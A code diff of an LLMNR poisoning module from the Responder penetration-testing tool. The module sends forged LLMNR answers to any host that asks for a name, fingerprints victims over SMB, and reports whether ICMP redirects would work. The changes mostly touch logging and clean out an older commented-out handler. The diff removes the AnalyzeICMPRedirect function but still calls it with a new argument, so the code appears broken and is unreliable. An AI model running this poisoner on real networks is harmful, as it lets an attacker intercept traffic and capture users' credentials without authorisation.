@@ -1,3 +1,19 @@
+#!/usr/bin/env python
+# This file is part of Responder
+# Original work by Laurent Gaffie - Trustwave Holdings
+#
+# This program is free software: you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+#
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with this program.  If not, see <http://www.gnu.org/licenses/>.
 import socket
 import struct
 import settings
@@ -31,21 +47,14 @@ def IsICMPRedirectPlausible(IP):
 			dnsip.extend(ip[1:])
 	for x in dnsip:
 		if x !="127.0.0.1" and IsOnTheSameSubnet(x,IP) == False:
-			print color("[Analyze mode: ICMP] You can ICMP Redirect on this network.", 5, 0)
-			print color("[Analyze mode: ICMP] This workstation (%s) is not on the same subnet than the DNS server (%s)." % (IP, x), 5, 0)
-			print color("[Analyze mode: ICMP] Use python Icmp-Redirect.py for more details.", 5, 0)
+			print color("[Analyze mode: ICMP] You can ICMP Redirect on this network.", 5)
+			print color("[Analyze mode: ICMP] This workstation (%s) is not on the same subnet than the DNS server (%s)." % (IP, x), 5)
+			print color("[Analyze mode: ICMP] Use `python tools/Icmp-Redirect.py` for more details.", 5)
 		else:
 			pass
 
-def AnalyzeICMPRedirect():
-	if settings.Config.Responder_IP is not None and settings.Config.Interface == 'Not set':
-		IsICMPRedirectPlausible(settings.Config.Responder_IP)
-
-	if settings.Config.Interface != 'Not set':
-		IsICMPRedirectPlausible(FindLocalIP(settings.Config.Interface))
-
 if settings.Config.AnalyzeMode:
-	AnalyzeICMPRedirect()
+	AnalyzeICMPRedirect(settings.Config.Bind_To)
 
 # LLMNR Server class
 class LLMNR(BaseRequestHandler):
@@ -67,7 +76,6 @@ class LLMNR(BaseRequestHandler):
 
 			# Analyze Mode
 			if settings.Config.AnalyzeMode:
-				Filename   = settings.Config.AnalyzeFilename
 				LineHeader = "[Analyze mode: LLMNR]"
 				print color("%s Request by %s for %s, ignoring" % (LineHeader, self.client_address[0], Name), 2, 1)
 
@@ -76,69 +84,10 @@ class LLMNR(BaseRequestHandler):
 				Buffer = LLMNR_Ans(Tid=data[0:2], QuestionName=Name, AnswerName=Name)
 				Buffer.calculate()
 				soc.sendto(str(Buffer), self.client_address)
-
-				Filename   = settings.Config.Log2Filename
-				LineHeader = "[LLMNR]"
+				LineHeader = "[*] [LLMNR]"
 
 				print color("%s Poisoned answer sent to %s for name %s" % (LineHeader, self.client_address[0], Name), 2, 1)
 
 			if Finger is not None:
-				print text("%s [FINGER] OS Version     : %s" % (LineHeader, color(Finger[0], 3, 0)))
-				print text("%s [FINGER] Client Version : %s" % (LineHeader, color(Finger[1], 3, 0)))
-
-
-"""
-# LLMNR Server class.
-class LLMNR(BaseRequestHandler):
-
-	def handle(self):
-		data, soc = self.request
-		try:
-			if data[2:4] == "\x00\x00":
-				if Parse_IPV6_Addr(data):
-					Name = Parse_LLMNR_Name(data)
-					
-					if settings.Config.AnalyzeMode and settings.Config.Finger_On_Off:
-
-						Message = "[Analyze mode: LLMNR] Host: %-15s  Request: %s." % (color(self.client_address[0], 3, 0), color(Name, 3, 0))
-
-						if PrintLLMNRNBTNS(settings.Config.AnalyzeFilename, Message):
-							print text(Message)
-					
-						try:
-							Finger = fingerprint.RunSmbFinger((self.client_address[0], 445))
-							print text("[Analyze mode: FINGER] OS: %s, Client: %s" % (color(Finger[0], 3, 0), color(Finger[1], 3, 0)))
-
-						except Exception:
-							print text("[Analyze mode: FINGER] Fingerprint failed for host %s." % color(Name, 3, 0))
-
-
-					
-					if settings.Config.AnalyzeMode == False:
-
-
-
-								buff = LLMNR_Ans(Tid=data[0:2], QuestionName=Name, AnswerName=Name)
-								buff.calculate()
-								soc.sendto(str(buff), self.client_address)
-								
-								Message = "[LLMNR] Poisoned answer sent to host: %-15s  Request: %s." % (color(self.client_address[0], 3, 0), color(Name, 3, 0))
-
-								if PrintLLMNRNBTNS(settings.Config.Log2Filename, Message):
-									print text(Message)
-								
-								if settings.Config.Finger_On_Off:
-									try:
-										Finger = fingerprint.RunSmbFinger((self.client_address[0], 445))
-										print text('[FINGER] OS: %s, Client: %s' % (color(Finger[0], 3, 0), color(Finger[1], 3, 0)))
-
-									except Exception:
-										print text('[FINGER] Fingerprint failed for host: %s' % color(Name, 3, 0))
-										pass
-					
-
-			else:
-				pass
-		except:
-			raise
-"""
+				print text("[FINGER] OS Version     : %s" % color(Finger[0], 3))
+				print text("[FINGER] Client Version : %s" % color(Finger[1], 3))
